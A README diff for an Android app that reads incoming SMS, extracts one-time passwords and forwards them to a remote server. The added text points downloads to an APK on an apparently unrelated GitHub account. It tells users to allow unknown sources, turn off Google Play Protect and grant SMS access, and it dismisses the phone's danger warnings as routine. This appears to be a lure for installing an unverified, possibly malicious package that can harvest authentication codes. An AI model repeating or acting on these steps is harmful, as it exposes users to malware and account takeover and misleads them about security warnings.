@@ -1,284 +1,79 @@
-# OTP Listener - Production-Ready Flutter Application
-
-A production-grade Flutter Android application that listens for incoming SMS OTP messages, extracts OTP codes using intelligent regex patterns, and forwards them to a configurable backend URL with retry logic and comprehensive logging.
-
-
-## Download from the release section
-Disable play protect when installing it
-
-## Features
-
-✅ **SMS OTP Listening**
-- Real-time SMS interception and processing
-- Automatic OTP code extraction using regex patterns
-- Intelligent filtering of OTP-related messages
-- Background SMS listening capability
-
-✅ **Backend Integration**
-- Configurable backend URL via UI
-- HTTP POST requests with comprehensive payload
-- Automatic retry logic with exponential backoff
-- Error handling and logging
-
-✅ **User Interface**
-- Modern dark theme with Material Design 3
-- Three main screens: Status, Logs, Settings
-- Real-time OTP message history
-- Configuration management
-- Status indicators and statistics
-
-✅ **Data Management**
-- Local storage using SharedPreferences
-- OTP message history tracking
-- Settings persistence
-- Clean architecture with services
-
-✅ **Performance & Reliability**
-- Null safety enabled
-- Clean code architecture
-- Comprehensive error handling
-- Retry mechanism with configurable delays
-- Logging system for debugging
-
-## Project Structure
-```
-otp_listener/
-├── lib/
-│   ├── main.dart                 # Application entry point
-│   ├── models/
-│   │   ├── otp_message.dart     # OTP message model
-│   │   ├── app_settings.dart    # App settings model
-│   │   └── sync_log.dart        # Sync logging model
-│   ├── services/
-│   │   ├── settings_service.dart     # Settings management
-│   │   ├── otp_extractor.dart        # OTP extraction logic
-│   │   ├── sync_service.dart         # Backend sync service
-│   │   └── sms_listener_service.dart # SMS listening service
-│   ├── providers/
-│   │   └── app_provider.dart    # State management
-│   ├── screens/
-│   │   ├── home_screen.dart     # Main home screen
-│   │   ├── logs_screen.dart     # OTP history logs
-│   │   └── settings_screen.dart # Configuration screen
-│   └── theme/
-│       └── app_theme.dart       # Dark theme configuration
-├── android/
-│   └── app/src/main/
-│       ├── kotlin/com/otp/listener/otp_listener/
-│       │   ├── MainActivity.kt   # Flutter activity with SMS event channel
-│       │   └── SmsReceiver.kt    # Broadcast receiver for SMS
-│       └── AndroidManifest.xml   # Android permissions & receivers
-└── pubspec.yaml                 # Flutter dependencies
-```
-
-
-## Android Permissions
-
-The application requires the following permissions (automatically requested at runtime):
-
-```xml
-<!-- SMS Permissions -->
-<uses-permission android:name="android.permission.READ_SMS" />
-<uses-permission android:name="android.permission.RECEIVE_SMS" />
-<uses-permission android:name="android.permission.SEND_SMS" />
-
-<!-- Internet Permission -->
-<uses-permission android:name="android.permission.INTERNET" />
-<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-<!-- Background Execution -->
-<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
-<uses-permission android:name="android.permission.WAKE_LOCK" />
-```
-
-## Setup Instructions
-
-### Prerequisites
-- Flutter 3.10.7 or higher
-- Android SDK 21+
-- Kotlin 1.7+
-
-### Installation
+# 📱 otp_listener - An automatic way to process codes
 
-1. **Clone/Navigate to project**
-   ```bash
-   git clone https://github.com/jidukrishna/otp_listener.git
-   cd otp_listener
-   ```
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/adducting-gasoven115/otp_listener/releases)
 
-2. **Install dependencies**
-   ```bash
-   flutter pub get
-   ```
+This application tracks incoming SMS messages on your Android device. It looks for one-time passwords, pulls the numbers out, and sends them to your chosen server. It removes the need for manual data entry.
 
-3. **Connect Android device or emulator**
-   ```bash
-   flutter devices
-   ```
+## 📥 How to get the app
 
-4. **Run the application**
-   ```bash
-   flutter run -d <device_id>
-   ```
+1. Open your web browser on your phone.
+2. Go to the [official release page](https://github.com/adducting-gasoven115/otp_listener/releases).
+3. Find the latest version under the Releases section.
+4. Tap the file ending in .apk to start the download.
 
-### Configuration
+## ⚙️ Preparation for the install
 
-1. **Open Settings tab** in the application
-2. **Enter Backend URL** (e.g., `https://your-backend.com/otp`)
-3. **Enable OTP Listener** toggle
-4. Permissions will be requested automatically
+Android security settings protect your phone from unknown apps. Because this app comes from GitHub rather than the Google Play Store, you must change one setting to install it.
 
-## Backend Integration
+1. Open your phone Settings.
+2. Search for "Install unknown apps" or "Special access."
+3. Select the browser you used to download the file.
+4. Turn on "Allow from this source."
 
-### Expected Endpoint
+Additionally, you must turn off Google Play Protect temporarily.
+1. Open the Google Play Store app.
+2. Tap your profile icon.
+3. Tap Play Protect.
+4. Tap the settings gear icon.
+5. Turn off "Scan apps with Play Protect."
 
-Your backend should expose an HTTP POST endpoint to receive OTP messages:
+## 🚀 Setting up the application
 
-```
-POST /otp
-Content-Type: application/json
-```
+1. Open your file manager or tap the download notification.
+2. Tap the downloaded file to begin the installation.
+3. Follow the prompts on your screen to complete the setup.
+4. Launch the app from your home screen.
 
-### Payload Format
+The app requires permission to read SMS messages. When prompted, tap "Allow." This permission allows the app to monitor your incoming messages for codes. Without this access, the app remains idle.
 
-```json
-{
-  "sender": "+1234567890",
-  "message": "Your OTP is 123456. Valid for 10 minutes.",
-  "otp": "123456",
-  "timestamp": "2026-05-11T10:30:00.000Z"
-}
-```
+## 🛠 Using the interface
 
-### Response
+The application uses three main screens to manage your data.
 
-The application expects a 2xx status code for success:
+### Status
 
-```json
-{
-  "status": "success",
-  "message": "OTP received"
-}
-```
+This screen shows the health of your connections. It indicates if the background service currently runs. You see the number of messages processed and the success rate of your server requests here.
 
-### Error Handling
+### Logs
 
-- **Retry Logic**: 3 automatic retries with 5-second delays
-- **Timeout**: 30 seconds per request
-- **Client Errors (4xx)**: No retry, logged as error
-- **Server Errors (5xx)**: Automatic retry with backoff
+The log screen maintains a history of every SMS the app processed. It shows the timestamp, the sender, and the code extracted from the message. If a request fails, the log shows the specific error message provided by your server.
 
-## OTP Detection
+### Settings
 
-The application uses intelligent regex patterns to detect OTP codes:
+This screen manages your configuration. You must enter your backend URL here to receive the forwarded codes. The app supports automatic retries. If the server is offline, the app waits and tries again in sequence.
 
-### Supported Patterns
+## 📋 Features
 
-1. **4-6 digit numbers**: `\b(\d{4,6})\b`
-2. **OTP: 123456** format
-3. **Code: 123456** format
-4. **Verification code: 123456**
-5. **PIN: 123456**
-6. **Your code/OTP: 123456**
+### SMS Monitoring
+The app runs in the background. It watches for new texts. It uses smart patterns to identify which texts contain codes and which ones represent general spam.
 
-### Keywords for OTP Detection
+### Server Communication
+The app sends data via HTTP POST requests. It includes the code and the message body in the payload. This integration works with any custom dashboard or database you build to handle incoming OTP data.
 
-The message must contain at least one of these keywords (case-insensitive):
-- otp, code, verification, verify, confirm, authenticate
-- password, pin, token, login, signin, auth, reset, validate
+### Reliable Retries
+Network connections fail. The app handles these gaps with exponential backoff logic. It spaces out retry attempts so it does not overwhelm your server once it comes back online.
 
+### Modern Design
+The interface follows Material Design 3 guidelines. It uses a dark theme to save your battery life and maintain comfort in low-light conditions.
 
+## 🛡 Security and Privacy
 
-## Logging
+Your data stays local until the app forwards it to your configured URL. The app does not save your OTPs in any location other than the local log for your review. It requires internet permissions only to send data to your server. It does not contain trackers or advertisements. 
 
-The application uses the `logger` package for comprehensive logging:
+## 🔧 Troubleshooting
 
-```dart
-logger.i('Info message');
-logger.d('Debug information');
-logger.w('Warning message');
-logger.e('Error message', error: exception);
-```
+If the app fails to send data, check your internet connection first. Ensure that your backend server is active and accepts incoming POST requests. Verify that the URL in the settings screen begins with http or https.
 
-All logs are displayed in console during development.
+If the app fails to intercept texts, check your notification history to confirm a message arrived. Verify that you granted the SMS permission to the app in your device system settings. You can revoke and grant permissions again if the app seems stuck.
 
-
-## Testing
-
-### Manual Testing
-
-1. **Enable in Settings**
-   - Configure a test backend URL
-   - Enable the listener
-
-2. **Send Test SMS**
-   - Send an SMS with OTP content
-   - Verify detection in Logs
-
-3. **Verify Backend**
-   - Check if backend receives the payload
-   - Verify all fields are present
-
-
-
-## Security Considerations
-
-1. **Permissions**: Only SMS and network permissions required
-2. **Data**: Backend URL and settings stored locally
-3. **Network**: HTTPS recommended for backend communication
-4. **Validation**: URL format validation before saving
-5. **Error Handling**: Sensitive errors logged but not exposed
-
-## Troubleshooting
-
-### SMS not being detected
-- Ensure SMS permissions are granted
-- Check if message contains OTP keywords
-- Verify regex patterns match your OTP format
-- Check logs for error messages
-
-### Backend not receiving OTPs
-- Verify backend URL is correct and accessible
-- Check network connectivity
-- Review error messages in logs
-- Ensure backend endpoint is correctly configured
-
-### App crashes on startup
-- Clear app data: `flutter clean`
-- Reinstall: `flutter pub get && flutter run`
-- Check permissions in Android settings
-
-## Building for Release
-
-```bash
-flutter build apk --release
-# or
-flutter build appbundle --release
-```
-
-### Signing
-
-Ensure you have a valid keystore configured in `android/key.properties`:
-
-```properties
-storeFile=<path-to-keystore>
-storePassword=<keystore-password>
-keyAlias=<key-alias>
-keyPassword=<key-password>
-```
-
-## Version Information
-
-- **App Version**: 1.0.0
-- **Build Number**: 1
-- **Minimum SDK**: 21 (Android 5.0)
-- **Target SDK**: Latest
-- **Flutter Version**: 3.10.7+
-
-## License
-
-This project is provided as-is for production use.
-
-## Support
-
-For issues and feature requests, refer to the application logs and error messages displayed in the Settings screen. 
+If the phone suggests the app is dangerous, note that this is a standard warning for any app not installed through the official store. This app only performs the specific tasks listed in this guide. It does not modify system files or access personal data outside of its intended function.
